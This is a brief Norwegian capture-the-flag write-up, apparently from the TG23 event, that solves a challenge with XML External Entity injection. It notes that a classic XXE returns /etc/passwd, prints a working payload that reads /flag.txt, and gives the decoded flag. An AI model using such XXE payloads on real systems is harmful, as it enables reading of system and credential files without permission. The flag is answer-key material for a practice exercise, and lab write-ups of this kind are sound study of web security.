# Writeup [Hjelpeside](./README.md)


## Writeup
### Flag 1
XML External Entity (XXE) injection angrep, men med noen ekstra undersider for litt rabbit holes.
Enn kan teste [klassisk XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#classic-xxe) og vil få `/etc/passwd` returnert.

Modifisert litt for å hente ut flag filen:
```xml
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///flag.txt'>]><root>&test;</root>
```
Flagget blir HTML Entity enkode, `TG23{Hakkespettene skj&#248;nner at XML kan v&#230;re farlig}`, men dette fikser Cyberchef lett med `From HTML Entity`, så vi får flagget
```
TG23{Hakkespettene skjønner at XML kan være farlig}
```